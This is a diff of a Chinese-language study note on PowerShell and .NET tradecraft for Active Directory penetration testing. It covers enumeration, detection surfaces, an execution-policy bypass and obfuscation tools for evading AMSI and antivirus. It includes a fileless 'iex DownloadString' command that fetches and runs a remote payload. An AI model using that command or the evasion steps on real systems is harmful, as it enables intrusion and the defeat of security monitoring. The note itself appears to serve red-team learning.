@@ -246,7 +246,32 @@ Enterprise Admins 群組擁有整個 Forest 層級的最高權限。
 
 ---
 
-PowerShell 基礎操作 
+在 Active Directory 內網滲透中，PowerShell 與 .NET 是最核心的攻擊載體。
+
+- 理解 PowerShell 在 AD 攻擊中的角色
+- 理解 Windows 環境的偵測面
+- 理解何時應使用 PowerShell、何時應改用 .NET Binary
+- 建立攻防可見度（visibility）思維
+
+為什麼 PowerShell 是 AD 攻擊核心載體?
+
+PowerShell 具備：
+
+- 預設安裝於 Windows 系統
+- 原生 .NET 支援
+- 直接存取 LDAP / AD API
+- 支援記憶體執行
+- 可直接調用 Windows API
+
+在 AD 內網滲透中，幾乎所有 Enumeration 行為都可透過 PowerShell 完成：
+
+- 列出 User / Group / Computer
+- 查詢 SPN
+- 查詢 ACL
+- 查詢 Delegation
+- 查詢 Trust
+
+AD 模組與基本操作
 
 載入 AD 模組 :
 
@@ -255,11 +280,12 @@ Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
 Get-Command -Module ActiveDirectory
 ```
 
-重點：
+重點 : 
 - 使用 AD 相關 cmdlet
 - 進行 Domain Enumeration
+- 查詢 user / group / SPN / ACL
 
-遠端下載並執行腳本（常見 red team 手法）
+記憶體執行（Memory Execution）
 
 ```bash=
 iex (New-Object Net.WebClient).DownloadString('http://www.webserver/payload.ps1')
@@ -268,10 +294,13 @@ iex (New-Object Net.WebClient).DownloadString('http://www.webserver/payload.ps1'
 重點：
 - 記憶體載入（fileless execution）
 - 不落地執行腳本
+- 減少檔案型 AV 偵測
 
-PowerShell 監控機制（Detection Surface）
+PowerShell Detection Surface（偵測面）
 
-系統層監控
+理解防禦面，才能理解攻擊面。
+
+```bash=
 - System-wide transcription
   - 記錄整個 PowerShell 操作過程
 
@@ -284,8 +313,9 @@ PowerShell 監控機制（Detection Surface）
 - Constrained Language Mode (CLM)
   - 限制 PowerShell 功能
   - 通常搭配 AppLocker / WDAC
+```
 
-Execution Policy（執行限制）
+Execution Policy（執行策略）
 
 常見參數 :
 
@@ -298,40 +328,38 @@ $env:PSExecutionPolicyPreference="bypass"
 
 重點：
 - Execution Policy 不是安全邊界
+- 它只是防止誤執行腳本
 - 真正的限制來自 AMSI / CLM / AV
 
-AV / AMSI 相關研究工具
+Tradecraft 不是工具清單，而是：
 
-常見研究工具：
-  - AMSITrigger
-    - 測試哪段程式碼被 AMSI 觸發
-  - DefenderCheck
-    - 測試哪段內容被 Defender 標記
-  - Invoke-Obfuscation
-    - PowerShell 程式碼混淆框架
-
-.NET Offensive Tradecraft
+- 目標環境是否啟用 Script Block Logging？
+- 是否部署 EDR？
+- 是否開啟 CLM？
+- 是否允許 PowerShell 遠端執行？
+- 是否應改用 .NET Binary？
 
 PowerShell 本質是 .NET。
 
-紅隊會：
-- 直接寫 C# 工具
-- 用 .NET API 操作 LDAP
-- 避免明顯 PowerShell artifact
+在高監控環境中，可能改用：
+- 直接撰寫 C# 工具
+- 使用 .NET API 操作 LDAP
+- 減少 PowerShell 特徵
 
-重點：
+常見策略：
 - Source Code Obfuscation
-- 編譯後 payload 混淆
-- 降低 signature 命中率
+- 字串混淆
+- API 間接調用
+- 編譯為獨立 Binary
 
-常見 .NET 混淆工具
-- ConfuserEx
-- Codecepticon（各種 PoC 與混淆實驗）
+混淆與偵測研究工具（研究用途）
 
----
+這些工具的價值在於理解偵測邏輯，而非盲目繞過。
 
-
-
+- AMSITrigger → 測試哪段程式碼觸發 AMSI
+- DefenderCheck → 測試哪段內容被 Defender 標記
+- Invoke-Obfuscation → PowerShell 混淆框架
+- ConfuserEx → .NET 混淆工具
 
 ---
 
